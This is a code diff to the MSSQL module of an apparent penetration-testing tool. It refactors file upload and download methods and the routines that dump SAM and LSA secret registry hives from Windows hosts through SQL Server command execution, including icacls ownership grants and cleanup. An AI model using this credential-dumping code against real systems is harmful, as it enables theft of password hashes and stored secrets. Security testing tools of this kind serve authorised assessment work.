@@ -443,9 +443,10 @@ class mssql(connection):
         return response
 
     @requires_admin
-    def put_file(self):
-        download_path = self.args.put_file[0]
-        remote_path = self.args.put_file[1]
+    def put_file(self, download_path=None, remote_path=None):
+        if remote_path is None and download_path is None:
+            download_path = self.args.put_file[0]
+            remote_path = self.args.put_file[1]
         self.logger.display(f"Copy {download_path} to {remote_path}")
         with open(download_path, "rb") as f:
             data = f.read()
@@ -464,9 +465,10 @@ class mssql(connection):
                 self.logger.debug(f"Error uploading via mssqlexec: {e}")
 
     @requires_admin
-    def get_file(self):
-        remote_path = self.args.get_file[0]
-        download_path = self.args.get_file[1]
+    def get_file(self, remote_path=None, download_path=None):
+        if remote_path is None and download_path is None:
+            remote_path = self.args.get_file[0]
+            download_path = self.args.get_file[1]
         self.logger.display(f'Copying "{remote_path}" to "{download_path}"')
 
         try:
@@ -646,12 +648,12 @@ class mssql(connection):
         get_owner_command = f"icacls C:\\windows\\temp\\{sam_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="sam")
         try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            exec_method.execute(dump_command)
-            exec_method.execute(get_owner_command)
-            exec_method.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
-            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            exec_method.execute(clean_command)
+            exec_method = MSSQLEXEC(self)
+            exec_method.execute(dump_command, True)
+            exec_method.execute(get_owner_command, True)
+            self.get_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
+            self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command, True)
         except Exception as e:
             self.logger.fail(f"Failed to dump SAM database, error: {e!s}")
             self.logger.debug(f"Error dumping SAM: {e}", exc_info=True)
@@ -681,12 +683,12 @@ class mssql(connection):
         get_owner_command = f"icacls C:\\windows\\temp\\{security_storename} /grant {self.username}:F && icacls C:\\windows\\temp\\{system_storename} /grant {self.username}:F"
         output_filename = self.output_file_template.format(output_folder="lsa")
         try:
-            exec_method = MSSQLEXEC(self.conn, self.logger)
-            exec_method.execute(dump_command)
-            exec_method.execute(get_owner_command)
-            exec_method.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
-            exec_method.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
-            exec_method.execute(clean_command)
+            exec_method = MSSQLEXEC(self)
+            exec_method.execute(dump_command, True)
+            exec_method.execute(get_owner_command, True)
+            self.get_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
+            self.get_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
+            exec_method.execute(clean_command, True)
         except Exception as e:
             self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
             self.logger.debug(f"Error dumping LSA: {e}", exc_info=True)
